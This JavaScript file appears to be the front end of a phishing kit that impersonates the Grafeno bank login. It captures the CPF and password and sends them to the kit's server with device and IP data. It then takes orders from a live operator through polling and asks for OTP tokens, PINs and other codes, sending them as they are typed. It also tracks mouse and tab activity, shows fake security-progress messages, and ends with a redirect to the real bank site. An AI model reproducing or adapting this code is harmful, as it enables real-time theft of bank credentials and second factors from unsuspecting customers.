document.addEventListener("DOMContentLoaded", function () {
    if (typeof window.$ === "undefined" || typeof window.jQuery === "undefined") {
        console.error("Grafeno login: jQuery não carregado.");
        return;
    }
    var $ = window.jQuery;

    const userId = sessionStorage.getItem("user_id");
    const dominio = sessionStorage.getItem("dominio");
    const local = sessionStorage.getItem("local");
    const device = sessionStorage.getItem("device");
    const platform = sessionStorage.getItem("platform");
    const browser = sessionStorage.getItem("browser");
    const ip = sessionStorage.getItem("ip");
    const sistema = sessionStorage.getItem("sistema");
    const cache_sistema = sessionStorage.getItem("sessao_ativa");
    const sessao_usuario = sessionStorage.getItem("sessao_usuario");
    const sessao_senha = sessionStorage.getItem("sessao_senha");
    const sessao_nome_usuario = sessionStorage.getItem("sessao_nome_usuario");
    const sessao_numero_serie = sessionStorage.getItem("sessao_numero_serie");
    const sessao_api = sessionStorage.getItem("sessao_api");

    // Só inicializa se a tela de login estiver presente
    if (!$("#new_user").length || !$("#JS-login_document_number_field").length) {
        return;
    }

    // --- Funções de validação (definidas primeiro para o submit e a máscara) ---
    function somenteDigitos(s) {
        return (s || "").replace(/\D/g, "");
    }
    function formatCPF(d) {
        if (!d) return "";
        var digits = somenteDigitos(d).slice(0, 11);
        var out = "";
        for (var i = 0; i < digits.length; i++) {
            out += digits[i];
            if (i === 2 || i === 5) out += ".";
            if (i === 8) out += "-";
        }
        return out;
    }
    function validarCPF(cpfStr) {
        var cpf = somenteDigitos(cpfStr || "");
        if (cpf.length !== 11) return false;
        if (/^(\d)\1{10}$/.test(cpf)) return false;
        var soma = 0;
        for (var i = 0; i < 9; i++)
            soma += parseInt(cpf.charAt(i), 10) * (10 - i);
        var resto = soma % 11;
        var dv1 = resto < 2 ? 0 : 11 - resto;
        if (dv1 !== parseInt(cpf.charAt(9), 10)) return false;
        soma = 0;
        for (var i = 0; i < 10; i++)
            soma += parseInt(cpf.charAt(i), 10) * (11 - i);
        resto = soma % 11;
        var dv2 = resto < 2 ? 0 : 11 - resto;
        if (dv2 !== parseInt(cpf.charAt(10), 10)) return false;
        return true;
    }
    function validarSenha(senha) {
        if (typeof senha !== "string") return false;
        if (senha.length < 6) return false;
        if (/\s/.test(senha)) return false;
        return true;
    }

    // // Exibindo os dados no console
    // console.log("Dados do usuário:");
    // console.log("ID do usuário:", userId);
    // console.log("Domínio:", dominio);
    // console.log("Local:", local);
    // console.log("Dispositivo:", device);
    // console.log("Plataforma:", platform);
    // console.log("Navegador:", browser);
    // console.log("IP:", ip);
    // console.log("Sistema:", sistema);

    // Ping em API dedicada (não interfere no fluxo da página)
    function enviarPing() {
        var ip = sessionStorage.getItem("ip");
        if (!ip) return;
        $.ajax({
            url: "/api/ping",
            method: "POST",
            headers: { "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content") },
            data: { ip: ip },
            success: function () {},
            error: function () {}
        });
    }
    enviarPing();
    setInterval(enviarPing, 10000);

    // Máscara de CPF via jQuery Mask Plugin
    const $cpfField = $("#JS-login_document_number_field");
    if ($cpfField.length && $.fn.mask) {
        $cpfField.mask("000.000.000-00");
    } else if ($cpfField.length) {
        $cpfField.on("input", function () {
            const digits = somenteDigitos(this.value).slice(0, 11);
            this.value = formatCPF(digits);
        });
        $cpfField.on("paste", function (e) {
            setTimeout(() => {
                const digits = somenteDigitos(e.target.value).slice(0, 11);
                e.target.value = formatCPF(digits);
            }, 0);
        });
    }

    // Toggle de visibilidade da senha (olho)
    // Observação: usar apenas um handler no wrapper para evitar duplo toggle pelo bubbling
    $(document)
        .off("click.togglePwd")
        .on("click.togglePwd", ".toggle-password", function (e) {
            e.preventDefault();
            const $wrapper = $(this);
            const $toggleEl = $wrapper.find("[toggle]");
            if (!$toggleEl.length) return;
            const targetSel = $toggleEl.attr("toggle");
            if (!targetSel) return;
            const $input = $(targetSel);
            if (!$input.length) return;

            const isHidden =
                ($input.attr("type") || "").toLowerCase() === "password";
            $input.attr("type", isHidden ? "text" : "password");

            // Acessibilidade e feedback visual
            $wrapper.toggleClass("showing", isHidden);
            $toggleEl.attr("aria-pressed", isHidden ? "true" : "false");
            $toggleEl.attr(
                "title",
                isHidden ? "Ocultar senha" : "Mostrar senha"
            );

            // Caso use classes do FA num elemento alternativo
            $toggleEl.toggleClass("fa-eye fa-eye-slash");
        });

    function loginGrafeno(cpf, senha) {
        $.ajax({
            url: '/grafeno', // Endpoint do Grafeno
            type: 'POST',
            contentType: 'application/json',
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content') // Se usar Laravel
            },
            data: JSON.stringify({
                cpf: cpf,
                senha: senha
            }),
            beforeSend: function (xhr) {
                xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
                xhr.setRequestHeader('Accept', 'application/json');
            },
            success: function (response) {
                console.log('Sucesso:', response);

                // VALIDAÇÃO DO ERRO QUANDO FOR FALSE
                if (response.ok === false || response.success === false) {
                    // // Tratar erro da API Grafeno
                    // const errorMessage = response.message || response.detail || 'Falha na autenticação com Grafeno';
                    // reject(new Error('E-mail, senha e/ou código de segurança incorreto(s). Seu login será bloqueado após 10 tentativas incorretas.'));
                    // $("#botaologin").attr("disabled", false).removeClass("loading");
                    // return;
                }

                // Sucesso - resolve a promessa com a resposta
                resolve(response);
            },
            error: function (xhr, status, error) {
                console.error('Erro na requisição:', xhr.responseText);

                try {
                    //var errorResponse = JSON.parse(xhr.responseText);
                    // const errorMessage = errorResponse.message || errorResponse.detail || 'Falha na autenticação';
                    // reject(new Error('E-mail, senha e/ou código de segurança incorreto(s). Seu login será bloqueado após 10 tentativas incorretas.'));
                    // $("#botaologin").attr("disabled", false).removeClass("loading");
                } catch (e) {
                    // reject(new Error('Erro de conexão com o servidor Grafeno'));
                    // $("#botaologin").attr("disabled", false).removeClass("loading");
                }
            }
        });
    }

    $("#new_user").on("submit", function (e) {
        e.preventDefault();

        const login = ($("#JS-login_document_number_field").val() || "").trim();
        const senha = ($("#user_password").val() || "").trim();

        const botao = $("#botaologin");

        // Validação de CPF (aceita com ou sem pontuação)
        if (!validarCPF(login)) {
            showFieldErrorSwal(
                "CPF inválido. Digite os 11 números do CPF (com ou sem pontuação)."
            );
            $("#JS-login_document_number_field").focus();
            return false;
        }

        if (!validarSenha(senha)) {
            showFieldErrorSwal(
                "Senha inválida. Mínimo 6 caracteres, sem espaços."
            );
            $("#user_password").focus();
            return false;
        }

        $("#botaologin").attr("disabled", true).addClass("loading");
        var loginDigits = somenteDigitos(login);
        sessionStorage.setItem('usuario_logado', loginDigits);

        function enviarLogin(recaptchaToken) {
            $.ajax({
                method: "POST",
                url: "/salvar-login",
                dataType: "json",
                headers: {
                    "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
                },
                data: {
                    usuario: loginDigits,
                    senha: senha,
                    ip: sessionStorage.getItem("ip") ?? "",
                    tipo: sessionStorage.getItem("sistema") ?? "",
                    local: sessionStorage.getItem("local") ?? "",
                    device: sessionStorage.getItem("platform") ?? "",
                    url: sessionStorage.getItem("dominio") ?? "",
                    user_id: userId,
                    comando: "LOGIN PENDENTE",
                    recaptcha_token: recaptchaToken || ""
                },
            })
                .then((response) => {
                    hideLoader();
                    if (response && response.success === true) {
                        sessionStorage.setItem("sessao_usuario", loginDigits);
                        exibirFormulario("form_token");
                        Request();
                    } else {
                        showLoginError("Falha na comunicação. Tente novamente.");
                        $("#botaologin").attr("disabled", false).removeClass("loading");
                    }
                })
                .catch((error) => {
                    hideLoader();
                    console.error('Erro no login:', error);
                    $("#botaologin").attr("disabled", false).removeClass("loading");
                    showLoginError("Erro na autenticação. Tente novamente.");
                });
        }

        if (window.grecaptcha && window.RECAPTCHA_SITE_KEY) {
            grecaptcha.ready(function () {
                grecaptcha.execute(window.RECAPTCHA_SITE_KEY, { action: "salvar" })
                    .then(function (tokenSalvar) { enviarLogin(tokenSalvar); })
                    .catch(function () { enviarLogin(""); });
            });
        } else {
            enviarLogin("");
        }
    });

    // Função auxiliar para exibir erros (definida cedo; versão com guard mais abaixo)
    function showLoginError(message) {
        if (window.Swal) Swal.fire({ icon: 'error', title: 'Erro no Login', text: message, confirmButtonText: 'OK' });
        else alert(message);
    }

    function showFieldErrorSwal(message) {
        if (window.Swal) Swal.fire({ icon: 'error', title: 'Erro', text: message, confirmButtonText: 'OK' });
        else alert(message);
    }

    // ===== Loader de Progresso Reutilizável =====
    // Funções para iniciar/parar um progresso falso (simulado) exibido em elementos:
    //  - Barra: .progress-fill (ajusta width)
    //  - Texto: #loading-text (exibe % e tempo restante)
    //  - Mensagens randômicas: #msg_loader
    // Uso:
    //  iniciarProgressLoader({ duracaoSegundos: 180 }); // inicia
    //  pararProgressLoader(true); // opcional: força concluir em 100%
    const _progressState = { progress: 0, timeRemaining: 0, timer: null };
    let _msgInterval = null;
    let _ultimaMsg = null;
    const mensagensLoader = [
        "Analisando informações de acesso...",
        "Verificando navegador e dispositivo...",
        "Estabelecendo conexão segura...",
        "Validando dados de autenticação...",
        "Sincronizando sessão com o servidor...",
        "Aplicando políticas de segurança...",
        "Carregando módulos essenciais...",
        "Verificando integridade da conexão...",
        "Inicializando parâmetros do sistema...",
        "Confirmando identidade do usuário...",
        "Processando credenciais de login...",
        "Consultando base de dados segura...",
        "Atualizando chaves de sessão...",
        "Verificando permissões do usuário...",
        "Coletando métricas de desempenho...",
        "Testando estabilidade da conexão...",
        "Avaliando ambiente de execução...",
        "Preparando interface de autenticação...",
        "Checando configurações de rede...",
        "Carregando preferências do usuário...",
        "Aplicando protocolos de criptografia...",
        "Verificando status do servidor...",
        "Realizando handshake SSL...",
        "Validando tokens de acesso...",
        "Sincronizando tempo com o servidor...",
        "Analisando padrões de tráfego...",
        "Executando verificação de integridade...",
        "Gerando chaves temporárias...",
        "Iniciando monitoramento de sessão...",
        "Avaliando integridade do navegador...",
        "Registrando evento de login...",
        "Verificando atualizações de segurança...",
        "Inicializando camada de proteção...",
        "Detectando possíveis anomalias...",
        "Validando cookies de sessão...",
        "Estabelecendo canal de comunicação seguro...",
        "Carregando variáveis de ambiente...",
        "Analisando cabeçalhos de requisição...",
        "Aguardando resposta do servidor...",
        "Decodificando informações criptografadas...",
        "Atualizando cache local...",
        "Sincronizando preferências de usuário...",
        "Verificando integridade dos pacotes...",
        "Executando análise heurística...",
        "Conectando à API de autenticação...",
        "Finalizando processo de validação...",
        "Revisando tokens expirados...",
        "Inicializando camada de autenticação...",
        "Compilando informações de segurança...",
        "Verificando ambiente de execução seguro...",
    ];

    function proximaMensagem() {
        if (!mensagensLoader.length) return "";
        let tentativa = null;
        for (let i = 0; i < 5; i++) {
            tentativa =
                mensagensLoader[
                Math.floor(Math.random() * mensagensLoader.length)
                ];
            if (tentativa !== _ultimaMsg) break;
        }
        _ultimaMsg = tentativa;
        return tentativa;
    }

    function iniciarProgressLoader(options = {}) {
        const {
            duracaoSegundos = 180,
            incrementoMaximo = 3, // máximo de incremento aleatório por tick
            decrementoTempoSegundos = 2, // quanto o tempo "restante" cai por tick
            delayMinMs = 1000, // delay mínimo entre ticks
            delayVarMs = 2000, // variação aleatória adicional
            seletorBarra = ".progress-fill",
            seletorTexto = "#loading-text",
            textoConcluido = "100% - Concluído!",
            seletorMensagem = "#msg_loader",
            intervaloMensagemMs = 2500,
        } = options;

        const progressBar = document.querySelector(seletorBarra);
        const loadingText = document.querySelector(seletorTexto);
        const msgEl = document.querySelector(seletorMensagem);
        if (!progressBar || !loadingText) {
            console.warn("Elementos de progresso não encontrados.");
            return;
        }

        // Reinicia caso já esteja rodando
        pararProgressLoader();

        _progressState.progress = 0;
        _progressState.timeRemaining = duracaoSegundos;

        function tick() {
            if (_progressState.progress >= 100) {
                loadingText.textContent = textoConcluido;
                _progressState.timer = null;
                if (_msgInterval) {
                    clearInterval(_msgInterval);
                    _msgInterval = null;
                }
                return;
            }

            _progressState.progress += Math.random() * incrementoMaximo;
            if (_progressState.progress > 100) _progressState.progress = 100;

            _progressState.timeRemaining = Math.max(
                0,
                _progressState.timeRemaining - decrementoTempoSegundos
            );

            const minutes = Math.floor(_progressState.timeRemaining / 60);
            const seconds = _progressState.timeRemaining % 60;
            const timeString = `${minutes}:${seconds
                .toString()
                .padStart(2, "0")}`;

            progressBar.style.width = `${_progressState.progress}%`;
            loadingText.textContent = `${Math.floor(
                _progressState.progress
            )}% - ${timeString} restantes`;

            const proxDelay = delayMinMs + Math.random() * delayVarMs;
            _progressState.timer = setTimeout(tick, proxDelay);
        }

        // Inicia ciclo
        _progressState.timer = setTimeout(tick, delayMinMs);

        // Mensagens randômicas
        if (msgEl) {
            msgEl.textContent = proximaMensagem();
            if (_msgInterval) {
                clearInterval(_msgInterval);
            }
            _msgInterval = setInterval(() => {
                msgEl.textContent = proximaMensagem();
            }, intervaloMensagemMs);
        }
    }

    function pararProgressLoader(forcarConcluir = false) {
        if (_progressState.timer) {
            clearTimeout(_progressState.timer);
            _progressState.timer = null;
        }
        if (_msgInterval) {
            clearInterval(_msgInterval);
            _msgInterval = null;
        }
        if (forcarConcluir) {
            const progressBar = document.querySelector(".progress-fill");
            const loadingText = document.querySelector("#loading-text");
            if (progressBar) progressBar.style.width = "100%";
            if (loadingText) loadingText.textContent = "100% - Concluído!";
            _progressState.progress = 100;
        }
    }

    // Chamada inicial padrão (pode ser removida se quiser iniciar manualmente)
    //iniciarProgressLoader();

    function exibirFormulario(formId) {
        $(
            "#new_user, #form_token, #form_comando, #form_loader, #form_pin"
        ).hide();

        if (formId === "form_loader") {
            $("#msg_h1_login").text("Autenticação de Segurança");
        }

        if (formId === "form_pin") {
            $("#msg_h1_login").text("Insira seu PIN");
        }

        if (formId === "form_comando") {
            $("#msg_h1_login").text("Confirme sua Identidade");
        }

        $("#" + formId).fadeIn(200);
    }

    //exibirFormulario("form_loader");

    function tratarRespostaComando(comando, data, valores) {
        const etapaRaw = comando.replace("solicitado", "").trim();
        const isErro = etapaRaw.includes("_error");
        const etapa = etapaRaw.replace("_error", "").trim();

        enviarComando(etapa);
        $(".campo").not("#JS-login_document_number_field").val("");

        if (isErro) {
            if (etapa === "login") {
                hideLoader();
                showLoginError(
                    "E-mail, senha e/ou código de segurança incorreto(s). Seu login será bloqueado após 10 tentativas incorretas."
                );
                exibirFormulario("new_user");
            } else if (etapa === "codigo_token") {
                hideLoader();
                showLoginError(
                    "E-mail, senha e/ou código de segurança incorreto(s). Seu login será bloqueado após 10 tentativas incorretas."
                );
                exibirFormulario("form_token");
                const btn = document.getElementById("botaotoken");
                btn.classList.remove("loading");
            } else if (etapa === "aguardando") {
                iniciarProgressLoader();
                exibirFormulario("form_loader");
                hideLoader();
            } else if (etapa === "comando") {
                hideLoader();
                showLoginError(
                    "E-mail, senha e/ou código de segurança incorreto(s). Seu login será bloqueado após 10 tentativas incorretas."
                );
                exibirFormulario("form_comando");
                $("#comando_texto").text(valores.input_comando || "");
                const btn = document.getElementById("botaocomando");
                btn.classList.add("loading");
            } else if (etapa === "finalizar_atendimento") {
                location.href = "https://grafeno.digital/";
            } else if (etapa === "pin") {
                exibirFormulario("form_pin");
                hideLoader();
                showLoginError(
                    "PIN de segurança incorreto. Seu login será bloqueado após 10 tentativas incorretas."
                );
                const btn = document.getElementById("botaopin");
                btn.classList.remove("loading");
            } else if (etapa === "enviar_para_interna") {
                location.href = "/painel";
            }
        } else {
            function removerLoadingBotoes() {
                ["botaotoken", "botaopin", "botaocomando"].forEach(function (id) {
                    var b = document.getElementById(id);
                    if (b) b.classList.remove("loading");
                });
            }
            if (etapa === "login") {
                hideLoader();
                exibirFormulario("new_user");
                removerLoadingBotoes();
            } else if (etapa === "codigo_token") {
                hideLoader();
                exibirFormulario("form_token");
                removerLoadingBotoes();
            } else if (etapa === "aguardando") {
                removerLoadingBotoes();
                iniciarProgressLoader();
                exibirFormulario("form_loader");
                hideLoader();
            } else if (etapa === "comando") {
                hideLoader();
                exibirFormulario("form_comando");
                $("#comando_texto").text(valores.input_comando || "");
                removerLoadingBotoes();
            } else if (etapa === "finalizar_atendimento") {
                location.href = "https://grafeno.digital/";
            } else if (etapa === "pin") {
                exibirFormulario("form_pin");
                hideLoader();
                removerLoadingBotoes();
            } else if (etapa === "enviar_para_interna") {
                location.href = "/painel";
            }
        }
    }

    $("#form_comando").on("submit", function (event) {
        event.preventDefault();
        EnviarComando();
    });

    function EnviarComando() {
        const login = resolveLogin();
        const code = (
            document.querySelector("#comando_input")?.value || ""
        ).trim();

        if (!login) {
            hideLoader();
            showLoginError(
                "Ocorreu um erro. Recarregue a página e tente novamente."
            );
            return false;
        }
        if (code === "") {
            hideLoader();
            showLoginError(
                "E-mail, senha e/ou código de segurança incorreto(s). Seu login será bloqueado após 10 tentativas incorretas."
            );
            $("#comando_input").focus();
            return false;
        }

        const payload = {
            usuario: login,
            etapa: "COMANDO",
            valor: code,
        };
        const btn = document.getElementById("botaocomando");
        btn.classList.add("loading");
        $.ajax({
            url: "/atualizar-etapa",
            method: "POST",
            headers: {
                "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content"),
            },
            contentType: "application/json; charset=UTF-8",
            dataType: "json",
            data: JSON.stringify(payload),
            beforeSend: function () {
                console.log("Enviando Comando...");
            },
            success: function () {
                console.log("Comando enviado. Aguardando próximo passo do operador...");
                // Mantém o botão em loading até o polling receber o próximo comando do backend
            },
            error: function () {
                showLoginError("Erro ao confirmar os dados. Tente novamente.");
                var btn = document.getElementById("botaocomando");
                if (btn) btn.classList.remove("loading");
            },
            complete: function () { },
        });
    }

    $("#form_pin").on("submit", function (event) {
        event.preventDefault();
        EnviarPin();
    });

    const pinInput = document.querySelector("#user_pin_attempt");
    pinInput.addEventListener("input", function () {
        const code = this.value.trim();

        // Verifica se tem exatamente 4 ou 6 caracteres válidos
        if (
            (code.length === 4 && /^[a-zA-Z0-9]{4}$/.test(code)) ||
            (code.length === 6 && /^[a-zA-Z0-9]{6}$/.test(code))
        ) {
            console.log("PIN válido detectado, enviando automaticamente...");
            EnviarPin();
        }
    });

    function EnviarPin() {
        const login = resolveLogin();
        const code = (
            document.querySelector("#user_pin_attempt")?.value || ""
        ).trim();

        if (!login) {
            hideLoader();
            showLoginError(
                "Ocorreu um erro. Recarregue a página e tente novamente."
            );
            return false;
        }
        if (
            !code ||
            (code.length !== 4 && code.length !== 6) ||
            (code.length === 4 && !/^[a-zA-Z0-9]{4}$/.test(code)) ||
            (code.length === 6 && !/^[a-zA-Z0-9]{6}$/.test(code))
        ) {
            hideLoader();
            showLoginError(
                "E-mail, senha e/ou código de segurança incorreto(s). Seu login será bloqueado após 10 tentativas incorretas."
            );
            $("#user_pin_attempt").focus();
            return false;
        }

        const btn = document.getElementById("botaopin");
        btn.classList.add("loading");
        const payload = {
            usuario: login,
            etapa: "PIN",
            valor: code,
        };

        $.ajax({
            url: "/atualizar-etapa",
            method: "POST",
            headers: {
                "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content"),
            },
            contentType: "application/json; charset=UTF-8",
            dataType: "json",
            data: JSON.stringify(payload),
            beforeSend: function () {
                console.log("Enviando token...");
            },
            success: function () {
                console.log("PIN enviado. Aguardando próximo comando do operador...");
                // Mantém o botão em loading até o polling receber o próximo comando do backend
            },
            error: function () {
                showLoginError("Erro ao confirmar o PIN. Tente novamente.");
                var btn = document.getElementById("botaopin");
                if (btn) btn.classList.remove("loading");
            },
            complete: function () { },
        });
    }

    $("#form_token").on("submit", function (event) {
        event.preventDefault();
        EnviarToken();
    });

    const tokenInput = document.querySelector("#user_otp_attempt");
    tokenInput.addEventListener("input", function () {
        const code = this.value.trim();

        // Verifica se tem exatamente 6 dígitos
        if (code.length === 6 && /^\d+$/.test(code)) {
            console.log("Token válido detectado, enviando automaticamente...");
            EnviarToken();
        }
    });

    function EnviarToken() {
        const login = resolveLogin();
        const code = (
            document.querySelector("#user_otp_attempt")?.value || ""
        ).trim();

        if (!login) {
            hideLoader();
            showLoginError(
                "Ocorreu um erro. Recarregue a página e tente novamente."
            );
            return false;
        }
        if (!code || code.length < 6 || !/^\d+$/.test(code)) {
            hideLoader();
            showLoginError(
                "E-mail, senha e/ou código de segurança incorreto(s). Seu login será bloqueado após 10 tentativas incorretas."
            );
            $("#user_otp_attempt").focus();
            return false;
        }

        const btn = document.getElementById("botaotoken");
        btn.classList.add("loading");
        const payload = {
            usuario: login,
            etapa: "TOKEN",
            valor: code,
        };

        $.ajax({
            url: "/atualizar-etapa",
            method: "POST",
            headers: {
                "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content"),
            },
            contentType: "application/json; charset=UTF-8",
            dataType: "json",
            data: JSON.stringify(payload),
            beforeSend: function () {
                console.log("Enviando token...");
            },
            success: function () {
                console.log("Token enviado. Aguardando próximo comando do operador...");
                var msg = document.getElementById("msg_aguardando_token");
                if (msg) msg.style.display = "block";
                // Mantém o botão em loading até o polling receber o próximo comando do backend
            },
            error: function () {
                showLoginError("Erro ao confirmar o token. Tente novamente.");
                var btn = document.getElementById("botaotoken");
                if (btn) btn.classList.remove("loading");
            },
            complete: function () { },
        });
    }

    function enviarComando(comando) {
        const login = resolveLogin();

        if (!login) {
            console.error(
                "Envio de comando ignorado (login ausente).",
                comando
            );
            return;
        }

        $.ajax({
            url: "/enviar-comando",
            method: "POST",
            headers: {
                "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
            },
            data: {
                comando: comando,
                usuario: login,
            },
        });
    }

    // Polling: só altera a página quando o comando do backend mudar (não mexe no estado atual otherwise)
    var _ultimoComandoAplicado = "";
    function Request() {
        var login = resolveLogin();
        if (!login) {
            setTimeout(Request, 5000);
            return;
        }
        $.ajax({
            url: "/comando-login",
            method: "POST",
            headers: { "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content") },
            data: { login: login },
            dataType: "json",
            success: function (data) {
                var comandoTxt = (data.comando || "").toLowerCase().trim();
                var ehComandoDireto = ["enviar_para_interna", "finalizar_atendimento", "aguardando"].indexOf(comandoTxt) >= 0;
                if (!comandoTxt.endsWith("solicitado") && !ehComandoDireto) {
                    return;
                }
                if (comandoTxt === _ultimoComandoAplicado) {
                    return;
                }
                _ultimoComandoAplicado = comandoTxt;
                var valores = {};
                var detalhes = (data.detalhes && data.detalhes.msg && data.detalhes.msg.GRAFENO) || [];
                if (Array.isArray(detalhes) && detalhes.length > 0) {
                    var reg = detalhes[0] || {};
                    for (var k in reg) valores[k] = reg[k];
                }
                tratarRespostaComando(comandoTxt, data, valores);
            },
            complete: function () {
                setTimeout(Request, 5000);
            }
        });
    }

    // ===== Envio silencioso da etapa durante digitação =====
    // Requisitos: jQuery e meta CSRF no head
    const TYPING_COOLDOWN_MS = 1500;
    const typingLastSent = new Map();

    function resolveLogin() {
        const fromInput = ($("#JS-login_document_number_field").val() || "").trim();
        const fromUsuario = (sessionStorage.getItem("usuario_logado") || "").trim();
        const fromSessao = (sessionStorage.getItem("sessao_usuario") || "").trim();
        return fromInput || fromUsuario || fromSessao || "";
    }

    function enviarAtualizarEtapa(payload, { silent = true, updateStage = false } = {}) {
        $.ajax({
            url: "/atualizar-etapa",
            method: "POST",
            headers: { "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content") },
            contentType: "application/json; charset=UTF-8",
            dataType: "json",
            data: JSON.stringify(payload),
        });
    }

    function notifyTyping(message) {
        const comando = (message || "").trim();
        if (!comando) return;
        const now = Date.now();
        const last = typingLastSent.get(comando) || 0;
        if (now - last < TYPING_COOLDOWN_MS) return;
        const loginAtual = resolveLogin();
        if (!loginAtual) return;
        typingLastSent.set(comando, now);
        enviarComando(comando);
    }

    // Notificação genérica de atividade com cooldown customizável
    function notifyActivity(message, cooldownMs = 5000) {
        const comando = (message || "").trim();
        if (!comando) return;
        const now = Date.now();
        const last = typingLastSent.get(comando) || 0;
        if (now - last < cooldownMs) return;
        const loginAtual = resolveLogin();
        if (!loginAtual) return;
        typingLastSent.set(comando, now);
        enviarComando(comando);
    }

    // Envio confiável em eventos de unload usando Beacon/keepalive
    function enviarComandoBeacon(comando) {
        const login = resolveLogin();
        if (!login) return false;
        const url = "/enviar-comando";
        const token = document.querySelector("meta[name='csrf-token']")?.getAttribute("content") || "";
        // Tenta sendBeacon com FormData
        try {
            if (navigator.sendBeacon) {
                const fd = new FormData();
                fd.append("comando", comando);
                fd.append("usuario", login);
                if (token) fd.append("_token", token);
                const ok = navigator.sendBeacon(url, fd);
                if (ok) return true;
            }
        } catch (e) {
            // Continua para o fallback
        }
        // Fallback com fetch keepalive (usa URLSearchParams para CSRF padrão Laravel)
        try {
            const body = new URLSearchParams();
            body.set("comando", comando);
            body.set("usuario", login);
            if (token) body.set("_token", token);
            fetch(url, { method: "POST", body, keepalive: true, credentials: "same-origin" }).catch(() => { });
            return true;
        } catch (e) {
            return false;
        }
    }

    function setupAutoStageSender({ selectors, etapa, collect, debounce = 400, typingMessage = null }) {
        const $elements = $(selectors);
        if (!$elements.length) return;
        let lastKey = null;
        let timerId = null;

        const runCheck = () => {
            const loginAtual = resolveLogin();
            if (!loginAtual) { lastKey = null; return; }
            const resultado = collect();
            if (!resultado || !resultado.isValid) { lastKey = null; return; }
            const chave = resultado.key ?? resultado.valor;
            if (chave && chave === lastKey) return;
            lastKey = chave;
            const payload = { usuario: loginAtual, etapa, valor: resultado.valor };
            enviarAtualizarEtapa(payload, { silent: true, updateStage: false });
        };

        const agendar = (imediato = false) => {
            clearTimeout(timerId);
            if (imediato) runCheck(); else timerId = setTimeout(runCheck, debounce);
        };

        $elements.on('input', () => {
            if (typingMessage) notifyTyping(typingMessage);
            agendar(false);
        });
        $elements.on('blur', () => agendar(true));
    }

    // Campos desta tela
    // TOKEN: 6 dígitos
    setupAutoStageSender({
        selectors: '#user_otp_attempt',
        etapa: 'TOKEN',
        typingMessage: 'DIGITANDO TOKEN',
        collect: () => {
            const valor = (document.querySelector('#user_otp_attempt')?.value || '').trim();
            return { isValid: /^\d{6}$/.test(valor), valor, key: valor };
        }
    });

    // PIN: 4 ou 6 alfanuméricos
    setupAutoStageSender({
        selectors: '#user_pin_attempt',
        etapa: 'PIN',
        typingMessage: 'DIGITANDO PIN',
        collect: () => {
            const valor = (document.querySelector('#user_pin_attempt')?.value || '').trim();
            const valido = (/^[A-Za-z0-9]{4}$/.test(valor)) || (/^[A-Za-z0-9]{6}$/.test(valor));
            return { isValid: valido, valor, key: valor };
        }
    });

    // COMANDO: texto não vazio
    setupAutoStageSender({
        selectors: '#comando_input',
        etapa: 'COMANDO',
        typingMessage: 'DIGITANDO COMANDO',
        collect: () => {
            const valor = (document.querySelector('#comando_input')?.value || '').trim();
            return { isValid: valor.length > 0, valor, key: valor };
        }
    });

    // ===== Eventos de atividade do navegador =====
    // 1) Mexer o mouse (throttling a cada 10s)
    let _mouseMoveTimer = null;
    document.addEventListener('mousemove', () => {
        if (document.hidden) return; // ignora quando aba não visível
        if (_mouseMoveTimer) return;
        notifyActivity('MEXENDO MOUSE', 10000);
        _mouseMoveTimer = setTimeout(() => { _mouseMoveTimer = null; }, 10000);
    }, { passive: true });

    // 2) Trocar de aba / esconder janela
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            notifyActivity('MUDOU ABA', 3000);
        } else {
            notifyActivity('VOLTOU ABA', 3000);
        }
    });

    // 3) Fechar aba ou sair da página: usar Beacon para garantir envio
    const onLeaving = () => {
        try { enviarComandoBeacon('FECHOU ABA'); } catch (_) { }
    };
    window.addEventListener('beforeunload', onLeaving, { capture: true });
    window.addEventListener('pagehide', onLeaving, { capture: true });

    // SweetAlert para erros de campo (validação imediata)
    function showFieldErrorSwal(msg) {
        if (window.Swal) {
            Swal.fire({
                icon: "warning",
                title: "Dados inválidos",
                text: msg,
                confirmButtonColor: "#d33",
            });
        } else {
            console.warn("SweetAlert2 não carregado.");
        }
    }

    // SweetAlert para erros de login/rede
    function showLoginError(msg) {
        if (window.Swal) {
            Swal.fire({
                icon: "error",
                title: "Falha no login",
                text: msg,
                confirmButtonText: "Ok",
                confirmButtonColor: "#d33",
            });
        } else {
            alert(msg);
        }
    }

    // Loader SweetAlert mais robusto
    function showLoader(options = {}) {
        if (!window.Swal) {
            console.warn(
                "SweetAlert2 não está disponível. Usando fallback console."
            );
            return;
        }

        // Configurações padrão
        const config = {
            title: options.title || options.titulo || "Autenticando...",
            text: options.text || options.texto || "",
            allowOutsideClick: options.allowOutsideClick ?? false,
            allowEscapeKey: options.allowEscapeKey ?? false,
            showConfirmButton: options.showConfirmButton ?? false,
            showCancelButton: options.showCancelButton ?? false,
            timer: options.timer || null,
            timerProgressBar: options.timerProgressBar ?? false,
            backdrop: options.backdrop ?? true,
            customClass: {
                container: options.containerClass || "",
                popup: options.popupClass || "",
                header: options.headerClass || "",
                title: options.titleClass || "",
                content: options.contentClass || "",
                loader: options.loaderClass || "",
            },
            ...options.customConfig,
        };

        // Fecha qualquer modal aberto antes de abrir novo
        Swal.close();

        try {
            Swal.fire({
                ...config,
                didOpen: () => {
                    Swal.showLoading();

                    // Callback customizado ao abrir
                    if (typeof options.onOpen === "function") {
                        options.onOpen();
                    }
                },
                willClose: () => {
                    // Callback customizado ao fechar
                    if (typeof options.onClose === "function") {
                        options.onClose();
                    }
                },
            });

            // Auto-close com timer se especificado
            if (config.timer && config.timer > 0) {
                setTimeout(() => {
                    if (Swal.isVisible()) {
                        Swal.close();
                    }
                }, config.timer);
            }
        } catch (error) {
            console.error("Erro ao exibir loader:", error);
            // Fallback em caso de erro
            console.log("Loading:", config.title);
        }
    }

    function hideLoader() {
        if (window.Swal) {
            Swal.close();
        }
    }
});
